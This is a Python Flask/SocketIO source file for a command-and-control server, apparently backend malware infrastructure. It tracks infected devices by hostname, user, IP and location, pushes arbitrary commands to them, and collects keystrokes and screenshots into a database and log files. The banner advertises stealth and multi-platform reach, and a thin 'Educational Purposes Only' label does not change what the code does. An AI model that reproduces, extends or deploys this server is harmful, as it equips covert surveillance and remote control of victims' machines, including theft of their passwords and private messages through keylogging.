#!/usr/bin/env python3
"""
ADVANCED C2 SERVER WITH KEYLOGGING STORAGE
Works on: https://c2-server-zz0i.onrender.com
Educational Purposes Only
"""

from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit, join_room, leave_room
import hashlib
import time
import threading
import os
import json
import base64
from datetime import datetime
from collections import defaultdict
import logging
import sqlite3
from pathlib import Path

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'c2-secret-key-change-this-in-production-12345')
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB
app.config['DATABASE'] = 'c2_database.db'
app.config['KEYLOG_FOLDER'] = 'keylogs'

# Create folders
os.makedirs(app.config['KEYLOG_FOLDER'], exist_ok=True)

# Use gevent
socketio = SocketIO(
    app, 
    cors_allowed_origins="*", 
    logger=False, 
    engineio_logger=False,
    async_mode='gevent'
)

# Initialize database
def init_database():
    """Initialize SQLite database"""
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    
    # Create tables
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (id TEXT PRIMARY KEY, hostname TEXT, os TEXT, username TEXT, 
                  ip TEXT, first_seen REAL, last_seen REAL, online INTEGER)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id TEXT PRIMARY KEY, client_id TEXT, command TEXT, 
                  timestamp REAL, status TEXT, output TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, 
                  keystrokes TEXT, timestamp REAL, application TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS screenshots
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, 
                  filename TEXT, timestamp REAL, size INTEGER)''')
    
    conn.commit()
    conn.close()

init_database()

# Data storage
clients = {}
command_queue = defaultdict(list)
client_lock = threading.Lock()
online_sockets = {}

@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'server': 'c2-server-zz0i.onrender.com',
        'features': ['real-time', 'keylogging', 'file-transfer', 'screenshots', 'multi-platform'],
        'message': 'Educational Purposes Only'
    })

@app.route('/health')
def health():
    with client_lock:
        online = sum(1 for c in clients.values() if c.get('online', False))
        return jsonify({
            'status': 'online',
            'clients_total': len(clients),
            'clients_online': online,
            'timestamp': time.time()
        })

@app.route('/clients')
def get_clients():
    with client_lock:
        clients_list = []
        for client_id, client in clients.items():
            clients_list.append({
                'id': client_id,
                'online': client.get('online', False),
                'hostname': client.get('hostname', 'Unknown'),
                'os': client.get('os', 'Unknown'),
                'username': client.get('username', 'Unknown'),
                'platform': client.get('platform', 'unknown'),
                'battery': client.get('battery', 'Unknown'),
                'location': client.get('location', 'Unknown'),
                'last_seen': client.get('last_seen', 0)
            })
        return jsonify(clients_list)

@app.route('/command', methods=['POST'])
def send_command():
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing parameters'}), 400
        
        cmd_id = f"cmd_{int(time.time())}_{hashlib.md5(command.encode()).hexdigest()[:6]}"
        command_data = {
            'id': cmd_id,
            'command': command,
            'timestamp': time.time(),
            'status': 'pending'
        }
        
        with client_lock:
            command_queue[client_id].append(command_data)
            
            if client_id in online_sockets:
                socketio.emit('command', command_data, room=online_sockets[client_id])
                return jsonify({'status': 'sent', 'command_id': cmd_id})
            else:
                return jsonify({'status': 'queued', 'command_id': cmd_id})
            
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/keylogs/<client_id>')
def get_keylogs(client_id):
    """Get keylogs for a client"""
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute("SELECT * FROM keylogs WHERE client_id = ? ORDER BY timestamp DESC LIMIT 100", (client_id,))
        logs = c.fetchall()
        conn.close()
        
        logs_list = []
        for log in logs:
            logs_list.append({
                'id': log[0],
                'keystrokes': log[2],
                'timestamp': log[3],
                'application': log[4]
            })
        
        return jsonify(logs_list)
    except:
        return jsonify([])

@app.route('/keylog', methods=['POST'])
def receive_keylog():
    """Receive keylog data from client"""
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        keystrokes = data.get('keystrokes')
        application = data.get('application', 'Unknown')
        
        if client_id and keystrokes:
            # Save to database
            conn = sqlite3.connect(app.config['DATABASE'])
            c = conn.cursor()
            c.execute("INSERT INTO keylogs (client_id, keystrokes, timestamp, application) VALUES (?, ?, ?, ?)",
                     (client_id, keystrokes, time.time(), application))
            conn.commit()
            conn.close()
            
            # Also save to file
            log_file = os.path.join(app.config['KEYLOG_FOLDER'], f"{client_id}.txt")
            with open(log_file, 'a', encoding='utf-8') as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] [{application}]: {keystrokes}\n")
            
            logger.info(f"Keylog received from {client_id}: {len(keystrokes)} chars")
            return jsonify({'status': 'received'})
        
        return jsonify({'error': 'Invalid data'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/screenshot', methods=['POST'])
def receive_screenshot():
    """Receive screenshot from client"""
    try:
        client_id = request.form.get('client_id')
        screenshot = request.files.get('screenshot')
        
        if client_id and screenshot:
            filename = f"screenshot_{client_id}_{int(time.time())}.png"
            filepath = os.path.join(app.config['KEYLOG_FOLDER'], filename)
            screenshot.save(filepath)
            
            # Save to database
            conn = sqlite3.connect(app.config['DATABASE'])
            c = conn.cursor()
            c.execute("INSERT INTO screenshots (client_id, filename, timestamp, size) VALUES (?, ?, ?, ?)",
                     (client_id, filename, time.time(), os.path.getsize(filepath)))
            conn.commit()
            conn.close()
            
            logger.info(f"Screenshot received from {client_id}: {filename}")
            return jsonify({'status': 'received', 'filename': filename})
        
        return jsonify({'error': 'Invalid data'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@socketio.on('connect')
def handle_connect():
    logger.info(f"New connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    with client_lock:
        for client_id, socket_id in list(online_sockets.items()):
            if socket_id == request.sid:
                if client_id in clients:
                    clients[client_id]['online'] = False
                    clients[client_id]['last_seen'] = time.time()
                del online_sockets[client_id]
                break

@socketio.on('register')
def handle_register(data):
    try:
        client_ip = request.remote_addr
        
        # Generate client ID
        if 'id' in data:
            client_id = data['id']
        else:
            unique = f"{data.get('hostname', '')}{data.get('os', '')}{data.get('username', '')}"
            client_id = hashlib.md5(unique.encode()).hexdigest()[:12]
        
        with client_lock:
            clients[client_id] = {
                'hostname': data.get('hostname', 'Unknown'),
                'os': data.get('os', 'Unknown'),
                'username': data.get('username', 'Unknown'),
                'platform': data.get('platform', 'unknown'),
                'battery': data.get('battery', 'Unknown'),
                'location': data.get('location', 'Unknown'),
                'ip': client_ip,
                'last_seen': time.time(),
                'online': True,
                'first_seen': time.time() if client_id not in clients else clients[client_id].get('first_seen', time.time())
            }
            
            online_sockets[client_id] = request.sid
            join_room(client_id)
            
            logger.info(f"Client registered: {client_id} - {data.get('hostname')} ({data.get('platform')})")
            
            emit('welcome', {
                'client_id': client_id,
                'message': 'Registered with C2 server',
                'timestamp': time.time()
            })
            
            # Send queued commands
            if client_id in command_queue and command_queue[client_id]:
                for cmd in command_queue[client_id]:
                    emit('command', cmd)
                command_queue[client_id] = []
                
    except Exception as e:
        logger.error(f"Registration error: {e}")
        emit('error', {'message': str(e)})

@socketio.on('heartbeat')
def handle_heartbeat(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        with client_lock:
            clients[client_id]['last_seen'] = time.time()
            clients[client_id]['online'] = True
            
            # Update additional data
            if 'battery' in data:
                clients[client_id]['battery'] = data['battery']
            if 'location' in data:
                clients[client_id]['location'] = data['location']
        
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('command_response')
def handle_command_response(data):
    client_id = data.get('client_id')
    command_id = data.get('command_id')
    output = data.get('output', '')
    
    logger.info(f"Command response from {client_id}: {command_id}")
    
    # Save to database
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO commands (id, client_id, command, timestamp, status, output) VALUES (?, ?, ?, ?, ?, ?)",
                 (command_id, client_id, data.get('command', ''), time.time(), 'completed', output))
        conn.commit()
        conn.close()
    except:
        pass
    
    emit('response_received', {
        'client_id': client_id,
        'command_id': command_id,
        'output': output,
        'timestamp': time.time()
    }, room=f"console_{client_id}")

def cleanup_stale_clients():
    while True:
        time.sleep(60)
        
        with client_lock:
            current_time = time.time()
            stale = []
            
            for client_id, client in list(clients.items()):
                if current_time - client.get('last_seen', 0) > 300:
                    stale.append(client_id)
            
            for client_id in stale:
                if client_id in clients:
                    del clients[client_id]
                if client_id in online_sockets:
                    del online_sockets[client_id]
                if client_id in command_queue:
                    del command_queue[client_id]

def print_banner():
    print("""
    ╔══════════════════════════════════════════════════╗
    ║           ADVANCED C2 SERVER                     ║
    ║      Multi-Platform • Keylogging • Stealth       ║
    ║        Educational Purposes Only                 ║
    ╚════════════════════════════━━━━━━━━━━━━━━━━━━━━━━╝
    """)
    print(f"[*] Server starting on port {os.environ.get('PORT', 10000)}")
    print("[*] Features: Keylogging, Screenshots, File Transfer")
    print("[*] Platforms: Android, iOS, Windows, Linux, macOS")
    print("[*] Press Ctrl+C to stop\n")

if __name__ == '__main__':
    print_banner()
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_stale_clients, daemon=True)
    cleanup_thread.start()
    
    # Run server
    port = int(os.environ.get('PORT', 10000))
    
    from gevent import pywsgi
    from geventwebsocket.handler import WebSocketHandler
    
    logger.info(f"Starting server on 0.0.0.0:{port}")
    
    server = pywsgi.WSGIServer(
        ('0.0.0.0', port),
        app,
        handler_class=WebSocketHandler
    )
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Server shutting down...")
        server.stop()
